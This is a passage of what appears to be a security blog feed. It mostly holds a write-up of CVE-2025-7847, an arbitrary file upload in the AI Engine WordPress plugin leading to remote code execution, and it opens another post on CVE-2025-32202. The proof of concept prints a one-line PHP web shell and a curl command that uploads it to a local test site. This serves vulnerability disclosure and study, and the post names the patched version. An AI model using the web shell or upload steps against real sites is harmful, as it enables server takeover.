}&#xA;    }&#xA;&#xA;  }&#xA;  else if ( $target === &amp;#39;library&amp;#39; ) {&#xA;&#xA;    if ( filter_var( $path, FILTER_VALIDATE_URL ) ) {&#xA;      $tmp = download_url( $path );&#xA;      if ( is_wp_error( $tmp ) ) {&#xA;        throw new Exception( $tmp-&amp;gt;get_error_message() );&#xA;      }&#xA;      $file_array = [ &amp;#39;name&amp;#39; =&amp;gt; $unique_filename, &amp;#39;tmp_name&amp;#39; =&amp;gt; $tmp ];&#xA;    }&#xA;    else {&#xA;      $file_array = [ &amp;#39;name&amp;#39; =&amp;gt; $unique_filename, &amp;#39;tmp_name&amp;#39; =&amp;gt; $path ];&#xA;    }&#xA;&#xA;    $id = media_handle_sideload( $file_array, 0 );&#xA;    if ( is_wp_error( $id ) ) {&#xA;      throw new Exception( $id-&amp;gt;get_error_message() );&#xA;    }&#xA;&#xA;    $url = wp_get_attachment_url( $id );&#xA;    update_post_meta( $id, &amp;#39;_mwai_file_id&amp;#39;, $refId );&#xA;    update_post_meta( $id, &amp;#39;_mwai_file_expires&amp;#39;, $expires );&#xA;&#xA;    // Store additional metadata&#xA;    if ( $metadata &amp;amp;&amp;amp; is_array( $metadata ) ) {&#xA;      foreach ( $metadata as $metaKey =&amp;gt; $metaValue ) {&#xA;        update_post_meta( $id, &amp;#39;_mwai_&amp;#39; . $metaKey, $metaValue );&#xA;      }&#xA;    }&#xA;&#xA;    // Store purpose and envId as post meta&#xA;    if ( $purpose ) {&#xA;      update_post_meta( $id, &amp;#39;_mwai_purpose&amp;#39;, $purpose );&#xA;    }&#xA;    if ( $envId ) {&#xA;      update_post_meta( $id, &amp;#39;_mwai_envId&amp;#39;, $envId );&#xA;    }&#xA;  }&#xA;&#xA;  return $refId;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;upload_file()&lt;/code&gt; function handles file storage and names files as follows:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Determine filename and extension: if &lt;code&gt;$filename&lt;/code&gt; is not provided, extract it from &lt;code&gt;$path&lt;/code&gt; and preserve the extension.&lt;/li&gt;&#xA;&lt;li&gt;Generate a unique filename by concatenating &lt;code&gt;$refId&lt;/code&gt; with the extension, then use &lt;code&gt;wp_unique_filename()&lt;/code&gt; to avoid collisions in the upload directory.&lt;/li&gt;&#xA;&lt;li&gt;Save the file: if &lt;code&gt;$target === &#39;uploads&#39;&lt;/code&gt; it copies into the uploads directory, if &lt;code&gt;$target === &#39;library&#39;&lt;/code&gt; it adds it to the Media Library using &lt;code&gt;media_handle_sideload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Return &lt;code&gt;$refId&lt;/code&gt;. The file is stored as &lt;code&gt;&amp;lt;refId&amp;gt;.&amp;lt;extension&amp;gt;&lt;/code&gt; in the uploads directory or Media Library, with metadata if provided.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-json/mwai/v1/simpleFileUpload&amp;#34;] --&amp;gt; B{&amp;#34;permission_callback&amp;#34;}&#xA;B -- Authenticated (X-WP-Nonce or Bearer) --&amp;gt; C[&amp;#34;rest_simpleFileUpload()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;simpleFileUpload()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;files-&amp;gt;upload_file(tmp_name, name, target, ...)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Determine extension → newFilename = refId.extension&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;target === &amp;#39;uploads&amp;#39; ?&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;copy(path, destination) → file placed in uploads&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;No filetype validation&amp;#34;}&#xA;I -- Yes --&amp;gt; J[&amp;#34;Uploaded .php accessible via URL&amp;#34;]&#xA;J --&amp;gt; L[&amp;#34;Response contain URL to file&amp;#34;]&#xA;L --&amp;gt; K[&amp;#34;Execute PHP → Remote Code Execution (RCE)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Upload the web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST \&#xA;  &amp;#34;http://localhost/wp-json/mwai/v1/simpleFileUpload&amp;#34; \&#xA;  -H &amp;#34;X-WP-Nonce: 51e6c4a45a&amp;#34; \&#xA;  -F &amp;#34;file=@rce.php&amp;#34; \&#xA;  -b &amp;#34;wp-settings-time-1=1762427921;&#xA;      wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce;&#xA;      wordpress_test_cookie=WP%20Cookie%20check;&#xA;      PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98;&#xA;      wp_lang=en_US;&#xA;      wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98;&#xA;      wp-settings-5=mfold%3Do;&#xA;      wp-settings-time-5=1762533510&amp;#34; \&#xA;  --proxy 127.0.0.1:8080 # Burp proxy&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/upload.png&#34; title=&#34;File uploaded successfully&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/upload.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload&lt;/h2&gt;&lt;p&gt;File uploaded successfully&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/upload.png&#39; alt=&#34;Upload&#34; height=&#34;573&#34; width=&#34;1545&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;File uploaded successfully&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;RCE with the web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/result.png&#34; title=&#34;RCE via uploaded file&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE via uploaded file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/result.png&#39; alt=&#34;Result&#34; height=&#34;573&#34; width=&#34;1545&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE via uploaded file&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-7847 is a serious &lt;strong&gt;arbitrary file upload&lt;/strong&gt; vulnerability in &lt;strong&gt;AI Engine 2.9.3–2.9.4&lt;/strong&gt;, allowing authenticated users (Subscriber+) to upload arbitrary files to the server via the REST API, leading to &lt;strong&gt;RCE&lt;/strong&gt;. Version 2.9.5 fixes the issue by adding file type checks (&lt;code&gt;wp_check_filetype&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;The vulnerability only applies when the &lt;strong&gt;Public REST API is enabled&lt;/strong&gt; and the user has a &lt;strong&gt;valid X-WP-Nonce&lt;/strong&gt; or a Bearer token.&lt;/li&gt;&#xA;&lt;li&gt;Root cause: &lt;strong&gt;missing file type validation&lt;/strong&gt; and directly copying the file into uploads.&lt;/li&gt;&#xA;&lt;li&gt;Mitigation: &lt;strong&gt;update the plugin to 2.9.5&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-2-9-3-2-9-4-authenticated-subscriber-arbitrary-file-upload&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WordPress Vulnerability Sinks</title>
      <link>http://localhost:1313/posts/2025-11-13-wordpress-vulnerability-sink/</link>
      <pubDate>Thu, 13 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-13-wordpress-vulnerability-sink/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-13-wordpress-vulnerability-sink/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-this-article&#34;&gt;&lt;span&gt;Why This Article?&lt;/span&gt;&#xA;  &lt;a href=&#34;#why-this-article&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32202 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-12-cve-2025-32202/</link>
      <pubDate>Wed, 12 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-12-cve-2025-32202/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;An &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; vulnerability in Brian Batt - elearningfreak.com for the &lt;strong&gt;Insert or Embed Articulate Content into WordPress&lt;/strong&gt; plugin allows uploading a &lt;strong&gt;Web Shell&lt;/strong&gt; to the web server. This issue affects &lt;strong&gt;Insert or Embed Articulate Content into WordPress&lt;/strong&gt;: from &lt;strong&gt;n/a&lt;/strong&gt; to &lt;strong&gt;4.3000000025&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32202&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32202&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.3000000025&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3000000026&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/insert-or-embed-articulate-content-into-wordpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed Articulate Content into WordPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Embed Articulate Content into WordPress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3000000025&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3000000026&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability lies in the &lt;code&gt;articulate_has_php_file()&lt;/code&gt; function at &lt;code&gt;/wp-content/plugins/insert-or-embed-articulate-content-into-wordpress/functions.php&lt;/code&gt; due to insufficient checks, allowing an attacker to upload a &lt;code&gt;.htaccess&lt;/code&gt; file to override handling in the uploads directory; as a result, subsequently uploaded files with attacker-chosen extensions (e.g., &lt;code&gt;.abc&lt;/code&gt;, &lt;code&gt;.xnxx&lt;/code&gt;) can be executed as PHP.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/add_check.png&#34; title=&#34;Adding a check for .htaccess&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/add_check.png&#34; data-sub-html=&#34;&lt;h2&gt;Add .htaccess&lt;/h2&gt;&lt;p&gt;Adding a check for .htaccess&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/add_check.png&#39; alt=&#34;Add .htaccess&#34; height=&#34;528&#34; width=&#34;1887&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Adding a check for .htaccess&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch added a condition to check for &lt;code&gt;.htaccess&lt;/code&gt; on upload to prevent this vulnerability.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an action hook for logged-in users&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_articulate_upload_file&amp;#39;, &amp;#39;articulate_upload_ajax_file&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So when accessing the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with param 